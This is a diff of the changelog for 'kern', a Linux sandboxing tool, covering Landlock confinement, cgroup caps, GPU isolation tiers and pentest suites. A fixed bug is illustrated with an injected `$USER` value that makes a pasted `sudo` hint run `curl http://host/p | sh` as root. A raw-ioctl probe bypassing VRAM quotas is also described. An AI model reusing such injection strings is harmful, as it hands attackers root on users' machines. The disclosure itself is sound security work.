@@ -100,8 +100,6 @@ class of images that runs today.
   image that declares a `USER`, medians 3.5 ms on both, minima 2.8 against 2.9. That is a cost BELOW
   THE NOISE FLOOR of this measurement, which is not the same as no cost and is not claimed as one.
 
-### Changed
-
 - **An image `USER` the image cannot resolve now refuses to start the box, as Docker does.** It used
   to run the workload as box root after printing a note on stderr, so that an odd image still
   started. That is the wrong shape of failure: an image whose entire purpose is to drop privilege got
@@ -120,6 +118,14 @@ class of images that runs today.
   `an_unresolvable_image_user_fails_closed_instead_of_running_as_box_root` red. Measured end to end:
   `USER 1000:nosuchgroup` and `USER nobodyhere` now exit 1, a resolvable `USER 1000` still gives
   `1000:0`, and `--user 0` still gives `0:0`.
+
+- `kern doctor` no longer tells you to write `cgroup.subtree_control` where you have no permission to
+  write it. It now says which of the two things is in the way, measured on the cgroup a box would be
+  capped in.
+- The uncapped-box warning names `XDG_RUNTIME_DIR` only when pointing it somewhere else would change
+  the answer. On a host with no user manager at all it says so instead.
+- The `no systemd user manager here` line in `doctor` says what that costs and what it prevents, so it
+  no longer reads as good news one row under the warning that caps do not bind.
 
 ### Fixed
 
@@ -227,248 +233,72 @@ class of images that runs today.
   the override discards the image's `CMD` as Docker documents - a default that belonged to the
   entrypoint being replaced.
 
-- **Final validation: eight sentences narrowed to their measurement, and one suite moved out of the
-  stamp and into CI.** Two reviewers, one asked whether the prose was wider than the evidence and one
-  asked whether the work survives without its author.
+- Two users on one machine can now both run boxes when `$XDG_RUNTIME_DIR` is shared between them (a
+  WSL distro with WSLg exports the same path to every uid). Whoever started a box first used to lock
+  the other out with `overlay scratch: Permission denied`. kern picks the next scratch location and
+  says so.
+- A failure to create the box scratch now names the directory.
 
-  Eight claims said more than had been measured, and none of them was wrong, which is the point:
-  each was stated at a width the measurement does not carry. "No userspace VRAM quota can be a
-  boundary" was universal over three hosts. "Trivially bypassed on consumer NVIDIA" was a class over
-  two NVIDIA machines. "`dmem` accounts faithfully on AMD and Intel from kernel 6.14" was a property
-  of a controller over one card, one driver, one kernel. "Every allocation entry point sits behind
-  the same ioctl channel" was an assertion about paths the probe never touched. The cooperative
-  tier's own claim ended with "for a real boundary use a MIG GPU or an SR-IOV part", pointing at
-  hardware whose VRAM split kern had just finished admitting it has never measured. The read-only
-  GPU scan was a property of the tool where it is one machine agreeing with the code. Each now
-  states its host, its card, its driver or its mechanism.
+## v0.7.1 - 2026-08-28
 
-  `pentest-gpu-claims.sh` now runs **in CI on every push**. It starts no box, so the AppArmor policy
-  that keeps the other four out does not apply, and on a GPU-less runner it exits 0 having asserted
-  that `doctor` reports the absence rather than inventing a card, and that the claim-word matcher
-  still catches an overstated string. That second one is the positive control: without it the whole
-  gate could go vacuous while every run stayed green. Verified by running the suite in a namespace
-  with an empty `/sys/class/drm` and a synthetic `/dev`.
+### Added
 
-  That split is the answer to a sharper point: a `.last-run` stamp is a promise that a person did
-  something, and a successor inheriting a red freshness check for suites CI structurally cannot run
-  will raise the threshold or silence it. So what can be automated is, what cannot is named, and the
-  stamp now covers four suites instead of standing in for five.
+- **`kern doctor` reports what a VRAM cap on each GPU would be worth.** One line per DRM card.
+  `TIER-HW` where the device enforces a partition (SR-IOV virtual function, or MIG instances
+  configured). `TIER-SOFT` everywhere else, which on consumer hardware means a cooperative quota:
+  worth density, fairness and overcommit accounting, **not a boundary against malicious code**. kern
+  still slices no GPU; this publishes the judgement before the capability. There is no middle tier
+  because `dmem` does not enforce the compute path ML tenants use: with `dmem.max` at 2 GB an 8 GB
+  `hipMalloc` succeeded while `dmem.current` stayed at 0. Detection is read-only, opens no device,
+  and costs 36 us per scan.
 
-  `CONTRIBUTING.md` gained the bridge the repo was missing: the GPU work is the TEST CASE for the
-  three rules, not the point of them. 915 lines printing two strings looks out of proportion until
-  that is said out loud, and it was said nowhere outside the commit messages. It also records the
-  shape of every defect three review rounds found: ten of them, all the same class, a sentence or an
-  exit code that said more than had been measured, and not one a runtime bug.
+- **`--landlock-rw <path>` works on `kern run`**, not only on `kern box`. Landlock restricts the
+  calling process, so no namespace is needed: `kern run --landlock-rw ~/project -- ./agent` confines
+  the binary's writes to that directory. Three differences from `box`, all because there is no
+  namespace: it grants only what you name plus the usual character devices, so `/tmp` and `/run` are
+  not automatic; it refuses to run where the kernel has no Landlock; and it implies `no_new_privs`,
+  so `sudo` inside the confined command stops working. A path that does not exist, or whose last
+  component is a symlink, is refused rather than skipped. Additive: no existing invocation changes.
 
-  And `stale-numbers.py` now says WHY its two pinned sentences are pinned. Each is an admission of a
-  limit, and they fail in opposite directions: losing the cooperative one makes a quota read as a
-  capability, losing the hardware one asserts an enforcement nobody checked. A gate that says only
-  "restore this string" hands a successor the lock without the reason.
-- **Closing the GPU phase: a shell payload in a `sudo` hint, a second weak green, and the rules
-  written down.** A third review round plus a closing review, and everything either fixed or stated.
-
-  `kern doctor` interpolated `$USER` into a `sudo tee` command it invites the reader to paste. With
-  `USER='x; curl http://host/p | sh #'` it printed a line that runs an attacker's script as root,
-  from the tool someone ran to find out whether their machine is safe; an ANSI escape in the same
-  variable reached the terminal verbatim. `$USER` is environment, and a container, a CI runner or
-  `sudo -E` all get to set it. It is now an allowlist of the portable POSIX name set, falling back to
-  the numeric uid, which `/etc/subuid` accepts and which cannot carry a payload. This code predates
-  the GPU work and was read because of it.
-
-  `pentest-gpu-claims.sh` had a second way to exit 0 without verifying anything: the previous round
-  closed the missing-compiler case, and left the case where the probe builds and there is no openable
-  device node for it to interrogate. Same verdict now, exit 3, different reason. Verified by running
-  the suite in a mount namespace where every GPU node is `/dev/null`.
-
-  `TIER-HW` was a branch no test could reach, and its fail-closed behaviour was asserted in a comment.
-  Two tests now drive it with a synthetic device directory: one forces the promotion with garbage in
-  every neighbouring attribute, one asserts garbage everywhere with no partition link falls to
-  `TIER-SOFT` without panicking. The promotion itself still has no positive control, and SECURITY.md
-  now says so in prose along with the probe's AMD arm having never executed, because both were marked
-  in the source where a reader deciding whether to trust the verdict never looks.
-
-  `check_scope_toll` printed its measured median with no ceiling on the interpretation, so a loaded
-  host could report "at least 8472.3 ms" as though that were the cost of a systemd scope. The number
-  is still printed; above 250 ms, six times the worst host ever measured, it now carries the fact
-  that it is most likely measuring load.
-
-  The claim gate matched `TIER-HW ... enforce` in one direction only, so the reverse order was a
-  false negative, and it would have failed a document describing the gate itself. Both fixed, with a
-  positive control for each. And the three rules the whole phase was built on, which lived only in
-  commit messages, are now `CONTRIBUTING.md`: ship a tier only if the code can assign it, publish the
-  demonstration that a defence is not a boundary before announcing it, and hold a claim to its code
-  with a gate that has a sabotage test rather than with the discipline of whoever edits next.
-- **A second review round: a lying exit code, a green that verified nothing, and the MIG mapping
-  settled from source.**
-
-  `gpu-raw-ioctl.c`'s `exhaust` mode returned the exit code the file's own header defines as "the
-  driver answered a raw ioctl" on the strength of `open` alone, having issued no ioctl at all. No
-  caller read it that way, which is not a defence. It now asks the last descriptor it opened, so the
-  code is true and the fact is stronger: the number counts handles that still reach the driver, not
-  handles that opened. Its `/proc/self/maps` scan also carries a tail between chunks, so a maps line
-  longer than the buffer can no longer hide a vendor library across the cut.
-
-  `pentest-gpu-claims.sh` could exit 0 on a host with a GPU and no C compiler: section A green,
-  battery B entirely skipped, nothing attacked. `run-all.sh` stamps `pentest/.last-run` on a zero,
-  and that stamp is what stops "not in CI" from decaying into "never run", so the decay was arriving
-  through the check meant to prevent it. There is now a third outcome, exit 3, that says the decisive
-  battery did not run; the skips stay skips, and the stamp is refused.
-
-  The MIG attribution is no longer unverified. It was the only remaining route to an unearned
-  `TIER-HW`: if `capabilities/gpu<N>` were keyed by something other than the device minor, one card's
-  instances could promote another. It is the device minor, read from NVIDIA's own source rather than
-  inferred from a single-GPU host that could not tell the two apart: `nv-procfs.c` prints
-  `nvl->minor_num` as `Device Minor:`, `nv.c`'s `nv_get_dev_minor()` returns that field, and `os.c`'s
-  `osRmCapRegisterGpu` formats the capability directory as `"gpu%u"` from it.
-
-  The claim gate grew an arm and lost an illusion. Any document that writes `TIER-HW` next to a form
-  of "enforce" must now carry the hardware caveat, matched over a window rather than a line because
-  markdown wraps and the first version of the rule was switched off by a line break. README, ROADMAP
-  and the FAQ were stating the short form without it. And the gate's docstring now records what it
-  cannot catch, with the reviewer's counterexample verbatim: a sentence added elsewhere on the page
-  that gives back what the caveat took away passes every check here, and detecting it is reading for
-  contradiction rather than pattern matching.
-- **The hardware tier now claims what it proved, after an outside review caught it claiming more.**
-  `TIER-HW` read "per-tenant VRAM enforced by the device", which asserts an ENFORCEMENT. What the
-  detector establishes is a TOPOLOGY: a `physfn` link means an SR-IOV virtual function, a `gi*`
-  capability means MIG instances are configured, and neither is a measurement of the memory split.
-  That is the same "present therefore enforcing" step this model refuses when it declines to promote
-  a card for merely having a `dmem` controller, so the strongest claim in the file was the least
-  supported, on the one branch that has no positive control anywhere in the tree because kern has
-  never run on MIG or SR-IOV hardware.
-
-  The string now names both gaps: that kern read the partition's presence and did not measure the
-  split, and that the verdict is per CARD while MIG partitions per INSTANCE ASSIGNED, so a tenant
-  handed the whole device node on a MIG-configured card is not inside a GPU instance. `stale-numbers`
-  pins the new wording in the code and in SECURITY.md, verified by sabotaging each.
-
-  Two smaller corrections from the same review. The `physfn` test required only that the path EXIST,
-  and the unit test fed it an empty regular file, so the check and its fixture agreed with each other
-  while both were looser than sysfs: it now requires the symlink the kernel actually creates, with a
-  test for the file case and one recording that a dangling link still counts. And SECURITY.md claimed
-  "no userspace mechanism" passes the raw-ioctl test, which is too wide: what fails is a userspace
-  VRAM QUOTA. Refusing the device outright, by not binding `/dev/nvidia*`, `/dev/dri/*` or
-  `/dev/kfd` into the box or by filtering `ioctl` on them, is userspace policy and does hold. A box
-  with no GPU is contained; a box with a GPU and a number attached to it is not.
-- **A fifth adversarial suite, and it publishes a defeat.**
-  [`pentest/pentest-gpu-claims.sh`](pentest/pentest-gpu-claims.sh) attacks a claim rather than a
-  mechanism: kern slices no GPU, so there is no cap here to break, and what is under test is whether
-  `kern doctor`'s verdict about each card survives contact with the host's own driver.
-
-  Section A checks what kern says: one tier row per DRM card counted from `/sys/class/drm` rather
-  than from kern's own output, the reserved vocabulary refused on every row below `TIER-HW` with a
-  positive control behind it, the disclaimer present on every cooperative row, the verdict identical
-  across five runs and unchanged with `LD_*`, `KERN_SECCOMP` and `KERN_CONFIG` set, and the GPU scan
-  asserted read-only against `strace`.
-
-  Section B is battery B of the GPU isolation spec, T1 to T9, run by
-  [`pentest/gpu-raw-ioctl.c`](pentest/gpu-raw-ioctl.c), a probe that links libc and nothing else and
-  reads its own `/proc/self/maps` before it counts anything. **T5 is the decisive one and it fails
-  the way the tier model says it must**: a process with no vendor library in its address space
-  reaches the driver with a raw ioctl. Measured on an RTX 5060 Ti (driver 580.173.02), a Jetson Orin
-  Nano (540.4.0, `tegra`, `nvidia-drm`) and a Raspberry Pi 5 (`v3d`, `vc4`), so it is not a property
-  of one driver build or one architecture. T7 settles the granularity: the descriptor answers the
-  same ioctl after crossing a unix socket into a process that never opened the device. T8 found the
-  ceiling on the boards, 1021 handles stopped by `RLIMIT_NOFILE`, which is the file-descriptor limit
-  a tenant inherited from its shell and not a device quota.
-
-  Section C is the only hard failure in the file: the card B found an open channel to must be the
-  card A calls `TIER-SOFT`. Everything B measures is a property of the driver; only a disagreement
-  between the claim and the measurement is kern's defect.
-
-  [SECURITY.md](SECURITY.md) now carries the same evidence in prose, including the `dmem` result
-  behind the missing middle tier, and `scripts/stale-numbers.py` gates the claim: a document may not
-  name a tier the code cannot print, the cooperative disclaimer must match `Tier::claim()` verbatim
-  on the two pages that carry it, and the reserved vocabulary must be identical in the Rust gate and
-  the shell one. All four arms verified by sabotage.
-
-  Also corrected while measuring it: `doctor`'s module header said it performed no mutation, and it
-  does. Its memory-cap check creates a `kern-capprobe-<pid>` cgroup, writes that child's own
-  `memory.max` and removes it, which is the only way to answer whether a cap binds. That was
-  documented in `kern-isolation` and contradicted in `doctor`; the header now names it.
-- **`kern doctor` now reports what a VRAM cap on each GPU would be worth.** kern still slices no GPU
-  and this changes nothing about what it can do: it publishes the JUDGEMENT ahead of the capability,
-  so there is never a window in which kern can cap a GPU while its own description of that cap is
-  still catching up.
-
-  One line per DRM card, with the evidence for it. `TIER-HW` for a partition the device itself
-  enforces (an SR-IOV virtual function, or MIG instances configured for that card). `TIER-SOFT` for
-  everything else, which on consumer hardware is what you get: a cooperative quota, worth density,
-  fairness and accidental-overcommit accounting for trusted and semi-trusted tenants, and **not a
-  boundary against malicious code**. A tenant that talks to the device without going through the
-  vendor library never passes any userspace interception, and VRAM is committed by a fault handled
-  in the kernel and the GSP, so there is no syscall to trap either. That is a property of the
-  problem, not a defect above the kernel, and the line says so where you would read it.
-
-  There is no middle tier, and its absence is a measurement rather than an omission. A
-  kernel-enforced `dmem` cap that charged the path the tenant allocates through would be one, but on
-  the driver this was measured against `dmem` accounts without enforcing for the ROCm compute path:
-  with `dmem.max` at 2 GB an 8 GB `hipMalloc` succeeded while the leaf cgroup's `dmem.current` stayed
-  at 0. The DRM render path is charged, the KFD compute path that ML tenants use is not. So `dmem`
-  and `/dev/kfd` are reported next to the card as FACTS and never as a promotion.
-
-  Detection is read-only: `/sys/class/drm`, three sysfs attributes per card, and `/proc` for the
-  NVIDIA and cgroup facts. It opens no device, loads no library and caps nothing, which is why it
-  fits in the same single static binary. Measured at 36 us per scan on an i7-14700KF, against a
-  `doctor` run that already spends milliseconds in `systemd-run` probes.
-
-  It fails closed in both directions that matter. Unknown resolves to the weaker claim, never the
-  stronger: a card is promoted only on evidence read from the kernel, and MIG instances are
-  attributed to the card that owns them by PCI address, so one MIG card on a host cannot promote
-  another. And a card kern cannot identify is DESCRIBED, not dropped: a Raspberry Pi 5 (`v3d`,
-  `vc4-drm`) and a Jetson Orin Nano (`drm`, `nv_platform`) have DRM cards on the platform bus with no
-  PCI vendor at all, and both now name the driver instead of reporting no GPU. Verified on both
-  boards.
-- **`--landlock-rw <path>` now works on `kern run`**, not only on `kern box`. It is the one confinement
-  the governor verb can offer for real, because Landlock restricts the calling process instead of
-  requiring a mount namespace: no image, no `pivot_root`, nothing to build. `kern run --landlock-rw
-  ~/project -- ./agent` runs the binary already on the host with its writes confined by the kernel to
-  that directory, while everything else stays readable and executable. This is additive: no existing
-  invocation changes behaviour.
-
-  Two things differ from the same flag on `box`, both because there is no namespace to hide behind.
-  **It grants only what you name**, plus the character devices a program opens for writing
-  (`/dev/null`, `/dev/zero`, `/dev/full`, `/dev/random`, `/dev/urandom`, `/dev/tty`). Inside a box
-  `/tmp`, `/run` and `/proc` are the box's own ephemeral ones and are granted automatically; on the
-  host they are real and persistent (`/run/user/$UID` alone holds the systemd user manager's private
-  socket), so granting them would silently widen "confine writes to this path" into something else.
-  And **it refuses to run** where the kernel has no Landlock, diverging from `run`'s cooperative
-  policy for resource caps: a cap that cannot be applied leaves the command running without a limit,
-  which `run` says out loud, but a confinement that cannot be applied would leave it running with the
-  operator's files reachable while they believed otherwise.
-
-  It implies `no_new_privs`, which Landlock requires, so `sudo` inside the confined command stops
-  working. A `--landlock-rw` path that does not exist, or whose final component is a symlink, is now
-  refused with the path named rather than silently skipped: on a box that silence is fail-safe, but
-  under `run` the allowlist is the entire confinement, so a grant that vanishes leaves a command that
-  can write nowhere.
-
-  The flag reaches the process that execs the workload through the scope re-exec as argv, which is
-  passed verbatim. That is a property of the code rather than of the type, and if it ever broke, an
-  argv that lost the flag would be indistinguishable from one that never carried it: a confined
-  workload and an unconfined one, with nothing downstream able to tell them apart. So the request now
-  travels beside it as a predicate (`KERN_LANDLOCK_REQUIRED`), never the paths. The two channels are
-  asymmetric on purpose and never assert the same fact, so they cannot disagree in a way that needs a
-  tie-break; the predicate arriving without the paths is the impossible state, it is the exact
-  signature of a lost transport, and it aborts before `execve`. Losing both across the same `execve`
-  takes two independent bugs rather than one.
-
-  Verified on this desktop (Landlock ABI 8) with a positive control on every assertion: writes land in
-  the granted path, `/tmp` and `/etc` are denied while the same write succeeds without the flag, reads
-  and `exec` outside the grant still work, the confinement survives `execve` into a child, a symlink
-  planted inside the grant does not reach outside it, cross-directory `rename` and `link` out of the
-  grant are denied, and `/proc/self/oom_score_adj` is not writable. The cost is below the noise floor
-  of 600 interleaved runs.
+- **A fifth adversarial suite, `pentest/pentest-gpu-claims.sh`**, attacking a claim rather than a
+  mechanism: whether `kern doctor`'s verdict about each card survives contact with the driver. T5 is
+  the decisive case and it fails the way the tier model says it must, on three machines: a process
+  with no vendor library in its address space reaches the driver with a raw ioctl. It starts no box,
+  so it runs **in CI on every push**, unlike the other four.
 
 ### Fixed
 
+- ⚠️ **A box that used to run uncapped on some hosts is now capped, and can be OOM-killed where it
+  previously survived.** `--memory` and the pid cap now bind when kern runs **as root** on a host
+  with no `systemd --user` manager: a container, or WSL2, where kern is uid 0. Boxes there had no
+  ceiling at all, including the defaults that apply with no flags. `kern doctor` shows which kind of
+  host you are on; `--allow-uncapped` keeps the old behaviour. Hosts that were already capping are
+  unaffected, and so is a ROOTLESS session with no user manager: there kern still has no cgroup it
+  may write to, and still says so at every start. A colima guest reached over `colima ssh` is that
+  second case, measured on Apple Silicon: the session lands in `/system.slice/ssh.service`, owned by
+  root and not writable by the user, and no `user@<uid>.service` is ever created.
+
+- **`kern doctor` interpolated `$USER` into a `sudo` command it invites you to paste.** With
+  `USER='x; curl http://host/p | sh #'` it printed a line that runs an attacker's script as root. It
+  is now an allowlist of the portable name set, falling back to the numeric uid.
+
+- **macOS is answered where a Mac user looks.** The installer refused Darwin and stopped; the README,
+  the platform table and both SDK pages did not mention macOS at all. All of them now say the same
+  thing: no native port, kern runs inside a Linux VM on a Mac, verified on Apple Silicon with an
+  Ubuntu 24.04 guest, with the two obstacles that guest produces and their fixes. The installer looks
+  for a VM you already have before suggesting one. CI runs those messages on a real Mac every push.
+
+- **`kern examples` promised a per-line GPIO grant kern does not make.** It said `pins` exposes only
+  those lines; the grant is chip-granular, and requesting any pin binds every `/dev/gpiochipN` on the
+  host. Corrected where the field is declared, with a test that fails on the old wording.
+
 - **A Landlock grant on a file rather than a directory no longer loses the whole ruleset.** The rule
-  was built with every access right the kernel's ABI knows, including the directory-only ones
-  (`*_DIR`, `MAKE_*`, `REFER`); the kernel answers `EINVAL` when those are asked for on a file or a
-  device node, and the failure discards the entire ruleset, not just that rule. Every path kern granted
-  before happened to be a directory, so this was latent on both verbs: `kern box --landlock-rw
-  /etc/hosts` failed the same way. The rights are now masked to the file-valid subset when the target
-  is not a directory, so a per-file grant works and a `fstat` that fails takes the narrower branch.
+  carried directory-only rights, the kernel answered `EINVAL` on a file, and the failure discarded
+  every rule. `kern box --landlock-rw /etc/hosts` failed that way on both verbs.
+
+- **`TIER-HW` claimed an enforcement it had not measured.** It read "per-tenant VRAM enforced by the
+  device"; what the detector establishes is a topology, not a memory split. The string now names both
+  gaps, including that the verdict is per card while MIG partitions per instance.
 
 ## v0.7.0 - 2026-08-24
 
